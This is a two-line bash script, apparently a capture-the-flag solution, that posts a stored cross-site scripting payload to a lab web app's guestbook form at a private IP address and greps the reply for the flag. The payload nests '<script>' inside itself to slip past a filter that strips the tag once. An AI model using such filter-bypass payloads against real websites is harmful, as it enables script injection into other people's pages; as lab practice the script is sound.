#!/bin/bash
curl "http://10.0.2.15/?page=feedback" --data "txtName=<scri<script>pt>&mtxtMessage=alert();&btnSign=Sign+Guestbook" | grep -i flag
